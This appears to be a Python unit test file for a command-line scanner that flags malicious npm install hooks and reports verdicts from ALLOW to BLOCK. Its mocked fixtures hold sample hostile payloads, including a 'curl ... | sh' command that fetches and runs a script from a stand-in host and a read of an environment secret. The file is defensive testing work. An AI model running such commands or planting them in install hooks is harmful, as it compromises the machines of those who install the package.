"""Unit tests for phanos.phanos_cli."""

from __future__ import annotations

from pathlib import Path
from unittest.mock import patch

from typer.testing import CliRunner

from phanos.ast_filter import ASTFilterResult
from phanos.ollama_client import OllamaVerdict
from phanos.phanos_cli import ScanReport, ScriptScanResult, app

FIXTURE_MANIFEST = Path(__file__).parent / "fixtures" / "package.json"

runner = CliRunner()


def _filter_result(*, suspicious: bool, payload: str = "") -> ASTFilterResult:
    return ASTFilterResult(
        is_suspicious=suspicious,
        matched_triggers=["execution:test"] if suspicious else [],
        condensed_payload=payload,
    )


def _verdict(verdict: str, *, score: int = 50) -> OllamaVerdict:
    return OllamaVerdict(
        malice_score=score,
        detected_risk_indicators=["suspicious_network_activity"],
        is_obfuscated=verdict != "ALLOW",
        deobfuscated_logic_summary="Potential outbound request during install hook.",
        verdict=verdict,  # type: ignore[arg-type]
    )


@patch("phanos.phanos_cli.ScanPipeline")
def test_scan_fast_tracks_clean_manifest(mock_pipeline_cls) -> None:
    mock_pipeline_cls.return_value.run.return_value = ScanReport(
        manifest_path=FIXTURE_MANIFEST,
        sandbox_root=FIXTURE_MANIFEST.parent,
        script_results=[
            ScriptScanResult(
                package_name="demo",
                hook_name="postinstall",
                filter_result=_filter_result(suspicious=False),
            )
        ],
        fast_tracked=True,
    )

    result = runner.invoke(app, ["scan", str(FIXTURE_MANIFEST), "--skip-deps"])

    assert result.exit_code == 0
    assert "CLEAR" in result.stdout


@patch("phanos.phanos_cli.ScanPipeline")
def test_scan_allow_verdict_exits_zero(mock_pipeline_cls) -> None:
    mock_pipeline_cls.return_value.run.return_value = ScanReport(
        manifest_path=FIXTURE_MANIFEST,
        sandbox_root=FIXTURE_MANIFEST.parent,
        script_results=[
            ScriptScanResult(
                package_name="demo",
                hook_name="postinstall",
                filter_result=_filter_result(suspicious=True, payload="fetch('https://evil.test')"),
            )
        ],
        verdict=_verdict("ALLOW", score=12),
        fast_tracked=False,
    )

    result = runner.invoke(app, ["scan", str(FIXTURE_MANIFEST), "--skip-deps"])

    assert result.exit_code == 0
    assert "ALLOW" in result.stdout


@patch("phanos.phanos_cli.ScanPipeline")
def test_scan_review_verdict_exits_zero_by_default(mock_pipeline_cls) -> None:
    mock_pipeline_cls.return_value.run.return_value = ScanReport(
        manifest_path=FIXTURE_MANIFEST,
        sandbox_root=FIXTURE_MANIFEST.parent,
        script_results=[
            ScriptScanResult(
                package_name="demo",
                hook_name="preinstall",
                filter_result=_filter_result(suspicious=True, payload="process.env.SECRET"),
            )
        ],
        verdict=_verdict("REVIEW", score=45),
        fast_tracked=False,
    )

    result = runner.invoke(app, ["scan", str(FIXTURE_MANIFEST), "--skip-deps"])

    assert result.exit_code == 0
    assert "REVIEW" in result.stdout
    assert "suspicious_network_activity" in result.stdout


@patch("phanos.phanos_cli.ScanPipeline")
def test_scan_review_can_soft_fail_when_configured(mock_pipeline_cls) -> None:
    mock_pipeline_cls.return_value.run.return_value = ScanReport(
        manifest_path=FIXTURE_MANIFEST,
        sandbox_root=FIXTURE_MANIFEST.parent,
        script_results=[
            ScriptScanResult(
                package_name="demo",
                hook_name="preinstall",
                filter_result=_filter_result(suspicious=True, payload="process.env.SECRET"),
            )
        ],
        verdict=_verdict("REVIEW", score=45),
        fast_tracked=False,
    )

    result = runner.invoke(
        app,
        ["scan", str(FIXTURE_MANIFEST), "--skip-deps", "--fail-on-review"],
    )

    assert result.exit_code == 1
    assert "REVIEW" in result.stdout


@patch("phanos.phanos_cli.ScanPipeline")
def test_scan_block_verdict_breaks_pipeline(mock_pipeline_cls) -> None:
    mock_pipeline_cls.return_value.run.return_value = ScanReport(
        manifest_path=FIXTURE_MANIFEST,
        sandbox_root=FIXTURE_MANIFEST.parent,
        script_results=[
            ScriptScanResult(
                package_name="demo",
                hook_name="postinstall",
                filter_result=_filter_result(
                    suspicious=True,
                    payload="curl http://evil.test/payload.sh | sh",
                ),
            )
        ],
        verdict=_verdict("BLOCK", score=97),
        fast_tracked=False,
    )

    result = runner.invoke(app, ["scan", str(FIXTURE_MANIFEST), "--skip-deps"])

    assert result.exit_code == 1
    assert "BLOCK" in result.stdout
    assert "Malicious behavior detected" in result.stdout
    assert "97/100" in result.stdout
